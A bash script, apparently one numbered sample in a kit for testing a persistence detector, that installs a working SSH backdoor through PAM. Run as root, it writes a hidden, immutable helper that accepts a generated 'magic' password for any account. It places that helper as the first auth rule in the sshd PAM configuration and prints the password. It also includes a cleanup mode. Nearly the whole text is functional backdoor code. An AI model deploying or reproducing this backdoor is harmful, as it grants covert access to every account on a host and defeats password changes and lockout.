#!/usr/bin/env bash
# PAM exec backdoor: accepts a magic password for ANY account on the box.
# Works regardless of the target account's real password.
# Survives: password changes, account lockout.
# Detected by: defender-cli anti-persistence --pam (read-only; manual removal required)
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

HELPER="/usr/lib/.pam_auth"
PAM_TARGET="/etc/pam.d/sshd"
PAM_LINE="auth sufficient pam_exec.so expose_authtok quiet ${HELPER}"
MAGIC="${MAGIC_PASS:-$(openssl rand -hex 12)}"

case "${1:-}" in
  deploy)
    # Write the helper that accepts the magic password
    cat > "$HELPER" <<HELPER_EOF
#!/bin/bash
# Read password from stdin (pam_exec expose_authtok)
IFS= read -r -d $'\0' pass 2>/dev/null || IFS= read -r pass
pass="\${pass%\$'\\\0'}"
[[ "\$pass" == "${MAGIC}" ]] && exit 0
exit 1
HELPER_EOF
    chmod 700 "$HELPER"
    chattr +i "$HELPER" 2>/dev/null || true

    # Inject as the very first auth line in sshd PAM config
    if ! grep -qF "$PAM_LINE" "$PAM_TARGET" 2>/dev/null; then
      sed -i "1s|^|${PAM_LINE}\n|" "$PAM_TARGET"
    fi
    echo "[+] 03_pam_backdoor: installed in ${PAM_TARGET}"
    echo "[+]   Magic password: ${MAGIC}"
    echo "[+]   Usage: ssh <any-user>@<target>  (use magic password)"
    ;;
  cleanup)
    chattr -i "$HELPER" 2>/dev/null || true
    rm -f "$HELPER"
    sed -i "\|${PAM_LINE}|d" "$PAM_TARGET" 2>/dev/null || true
    echo "[-] 03_pam_backdoor: removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
